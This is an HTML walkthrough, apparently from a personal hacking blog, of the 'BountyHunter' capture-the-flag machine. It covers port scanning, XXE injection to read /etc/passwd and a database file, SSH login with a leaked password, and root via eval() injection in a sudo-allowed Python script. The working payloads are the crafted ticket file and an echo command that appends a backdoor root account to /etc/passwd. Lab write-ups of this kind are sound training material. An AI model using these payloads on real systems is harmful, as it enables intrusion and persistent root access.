@@ -1,0 +1,131 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>BountyHunter Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+    
+    <h1>BountyHunter Walkthrough</h1>
+    
+    <hr>
+    
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#Development">Shell - Development</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+    
+    <h2><a id="summary">Summary</a></h2>
+    
+    <p>This box required an XXE exploitation on the web server.  The XXE exploitation allowed us to read a database file with credentials and /etc/passwd.  The database credentials were reused with a bash user on the box.  Once on the box we find we have sudo right to a python script.  We are able to abuse a eval() function in the script to obtain arbitrary code execution as root.</p>
+    
+    <h2><a id="portscan">Port Scanning</a></h2>
+    
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+    
+    <pre># Nmap 7.91 scan initiated Wed Nov 10 11:57:34 2021 as: nmap -p- -oN ping_tcp 10.129.253.52&#13;&#10;Nmap scan report for 10.129.253.52&#13;&#10;Host is up (0.044s latency).&#13;&#10;Not shown: 65533 closed ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;22/tcp open  ssh&#13;&#10;80/tcp open  http&#13;&#10;&#13;&#10;# Nmap done at Wed Nov 10 11:58:11 2021 -- 1 IP address (1 host up) scanned in 36.74 seconds</pre>
+    
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+    
+    <pre># Nmap 7.91 scan initiated Thu Nov 11 16:05:16 2021 as: nmap -p22,80 -sV -sC -oN script_tcp 10.129.253.52&#13;&#10;Nmap scan report for 10.129.253.52&#13;&#10;Host is up (0.037s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)&#13;&#10;|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)&#13;&#10;|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)&#13;&#10;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))&#13;&#10;|_http-server-header: Apache/2.4.41 (Ubuntu)&#13;&#10;|_http-title: Bounty Hunters&#13;&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Thu Nov 11 16:05:32 2021 -- 1 IP address (1 host up) scanned in 15.16 seconds</pre>
+    
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+    
+    <li>Since SSH is an uncommon first point of exploitation I focus my efforts on the web server on port 80.  I begin by running gobuster against the web server to enumerate any hidden directories. I run the command <code>gobuster dir -u http://10.129.253.52 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php</code>.  The reason I include the php extension is because I check to see if http://10.129.253.52/index.php exists and it does, which means the server is running php.  Next, while the gobuster scan is running, I visit the website and click on "MENU" and then "PORTAL"</li>
+    
+    <img src="../images/bountyhunter/menu.png">
+    
+    <br>
+    <br>
+    
+    <li>On the next page I select the hyperlink "here", which brings me to http://10.129.253.52/log_submit.php</li>
+    
+    <img src="../images/bountyhunter/bountyreportsystem.png">
+    
+    <br>
+    <br>
+    
+    <li>I fill out the form and interecept it with burp to see what is happening.</li>
+    
+    <img src="../images/bountyhunter/burp.png">
+    
+    <br>
+    <br>
+    
+    <li>It appears to be submitting an XML form in the web request in the data field.  I send this web request to repeater and then test to see if XML External Entity (XXE) injection works.  I submit the following:</li>
+    
+    <img src="../images/bountyhunter/xxe.png">
+    
+    <br>
+    <br>
+    
+    <li>I then highlight the XXE code and press <code>ctrl + b</code> to base64 encode it and then <code>ctrl + u</code> to html encode it, just like the original web request was.</li>
+    
+    <img src="../images/bountyhunter/passwd.png">
+    
+    <br>
+    <br>
+    
+    <li>The XXE injection works and we are able to see the contents of /etc/passwd.  In /etc/passwd we find the only user besides root with /bin/bash is "Development".  The only other port open on this machine is SSH on 22.  So if we can find the password or SSH key for the user "Development" then we can SSH in.  I look for an SSH key in /home/development/.ssh/id_rsa but nothing returns.</li>
+    
+    <br>
+    <h2><a id="Development">Shell - Development</a></h2>
+    
+    <li>By now the gobuster can has finished and we find that the directory /db.php exists.  This file might contain credentials for the database, and these credentials could be reused for the "Development" user, so I read the file contents using XXE injection.  At first I attempt to do so exactly like I did when I read the contents of /etc/passwd.  However, this does not work when trying to read php files.  Instead, I end up having to use a php wrapper and base64 encode the contents of /db.php in the web directory.  My web request looked as follows:</li>
+    
+    <img src="../images/bountyhunter/db.png">
+    
+    <br>
+    <br>
+    
+    <li>After base64 encoding and then url encoding the data=contents I send the web request.  It returns with the base64 encoded content of the db.php file.</li>
+    
+    <img src="../images/bountyhunter/db2.png">
+    
+    <br>
+    <br>
+    
+    <li>I take the base64 string that the server returned and I decode it.</li>
+    
+    <img src="../images/bountyhunter/db3.png">
+    
+    <br>
+    <br>
+    
+    <li>Using this password I am able to SSH in to the server as the user development.  <code>sshpass -p m19RoAU0hP41A1sTsq6K ssh development@10.129.253.52</code></li>
+    
+    <br>
+    <h2><a id="root">Shell - Root</a></h2>
+    
+    <li>Once on the box I check for sudo access using <code>sudo -l</code>.  I find that I have: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py.  I go to /opt and look at the script to see how it can be exploited.  The script accepts user input of any file ending in .md and verifies if the lines of the file meet the requirements to be a valid ticket file.
+    <ul> 
+        <li>Line 1 must have "# Skytrain Inc"</li>
+        <li>Line 2 must have "## Ticket to " on the second line.</li>
+        <li>Line 3 must have "__Ticket Code:__".</li>
+        <li>Line 4 must "**" with one or more numbers after it separated by addition (+) signs.  The first number must have a remainder of 4 when divided by 7.  All the numbers combined on this line must be over 100.</li>
+    </ul>
+    
+    <li>However, we do not necessarily care if a ticket is read as valid or not, we are looking to get arbitrary code execution as root since we have sudo rights to this script.  We find the script is using the eval() function on line 34 <code>validationNumber = eval(x.replace("**", ""))</code>.  The eval function can be abused to execute shell commands.  This line of code is reading the 4th line of the .md file.  In order to get the script to execute this line of code we must fulfill all the requirements laid out above.  Except we do not need the numbers to equal anything over 100 because eval() portion of the script gets executed before the script checks the sum of the numbers on this line.</li>
+
+    <br>
+
+    <li>After some experimenting I created the following file named /tmp/x.md</li>
+
+    <pre># Skytrain Inc&#13;&#10;## Ticket to root&#13;&#10;__Ticket Code:__&#13;&#10;**11+1,__import__(&apos;os&apos;).system(&apos;touch /tmp/test321&apos;)</pre>
+
+    <li>On the 4th line I have 11 because when it is divided by 7 there is a remainder of 4.  I have +1 after that because I needed to separate the <code>,__import__('os').system('touch /tmp/test321')</code> part in order for the script to parse the command correctly.  Running the command <code>sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code> and inputing /tmp/x.md creates the root owned file /tmp/test321.  This means we have arbitrary code execution as root.  I choose to create a 2nd root user in the /etc/passwd file.</li>
+
+    <pre># Skytrain Inc&#13;&#10;## Ticket to root&#13;&#10;__Ticket Code:__&#13;&#10;**11+1,__import__(&apos;os&apos;).system(&apos;echo &quot;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd&apos;)</pre>
+
+    <li>Then I use <code>su root2</code> and use the password "root" which is the hash I have included in the echo command.  Root is achieved.</li>
+        
+    </body>
+    </html>
